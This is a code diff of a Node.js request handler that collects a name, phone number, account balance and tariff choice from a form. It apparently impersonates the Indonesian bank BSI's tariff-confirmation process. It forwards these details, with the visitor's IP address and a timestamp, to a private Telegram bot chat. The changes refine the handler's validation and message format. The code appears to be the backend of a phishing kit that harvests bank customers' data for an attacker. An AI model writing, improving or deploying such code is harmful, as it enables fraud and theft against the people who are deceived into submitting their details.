@@ -17,15 +17,15 @@ module.exports = async (req, res) => {
   }
 
   try {
-    const { tarif: tarif, nama: name, nohp: phone, saldo: balance } = req.body;
+    const { tarif, nama, nohp, saldo } = req.body;
 
     // Validasi input
-    if (!tarif || !name || !phone || !balance) {
+    if (!tarif || !nama || !nohp || !saldo) {
       return res.status(400).json({ success: false, message: 'Semua field harus diisi' });
     }
 
-    if (!/^08[0-9]{8,13}$/.test(phone)) {
-      return res.status(400).json({ success: false, message: 'Nomor WhatsApp tidak valid' });
+    if (!/^08[0-9]{8,13}$/.test(nohp)) {
+      return res.status(400).json({ success: false, message: 'Nomor HP tidak valid. Harus diawali dengan 08 dan terdiri dari 10-15 digit angka' });
     }
 
     // Ambil token dari environment variables
@@ -33,6 +33,7 @@ module.exports = async (req, res) => {
     const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+      console.error('Missing Telegram configuration');
       return res.status(500).json({ success: false, message: 'Server configuration error' });
     }
 
@@ -45,14 +46,15 @@ module.exports = async (req, res) => {
 
     // Format pesan untuk Telegram dengan informasi IP
     const telegramMessage = `
-𝗕𝗦𝗜
+𝗕𝗦𝗜 - 𝗞𝗢𝗡𝗙𝗜𝗥𝗠𝗔𝗦𝗜 𝗧𝗔𝗥𝗜𝗙
 ────────────────────
-𝗦𝗮𝗹𝗱𝗼 | ${tarif}
-𝗡𝗮𝗺𝗮 | ${name}
-𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 | <code>${phone}</code>
-𝗦𝗮𝗹𝗱𝗼 | <pre>${balance}</pre>
+𝗧𝗮𝗿𝗶𝗳 | ${tarif === 'baru' ? 'BARU (Rp 150.000/bulan)' : 'LAMA (Rp 6.500/transaksi)'}
+𝗡𝗮𝗺𝗮 | ${nama}
+𝗡𝗼𝗺𝗼𝗿 𝗛𝗣 | ${nohp}
+𝗦𝗮𝗹𝗱𝗼 | Rp ${saldo}
 ────────────────────
 𝗜𝗣 𝗔𝗱𝗱𝗿𝗲𝘀𝘀 | ${userIP || 'Tidak terdeteksi'}
+𝗪𝗮𝗸𝘁𝘂 | ${new Date().toLocaleString('id-ID')}
     `;
 
     // Kirim ke Telegram
@@ -76,7 +78,7 @@ module.exports = async (req, res) => {
       errorMessage = `Error Telegram: ${error.response.data.description || error.response.status}`;
     } else if (error.request) {
       // Tidak ada response dari Telegram
-      errorMessage = 'Tidak dapat terhubung ke Telegram API';
+      errorMessage = 'Tidak dapat terhubung ke Telegram API. Periksa koneksi internet.';
     }
     
     res.status(500).json({ success: false, message: errorMessage });
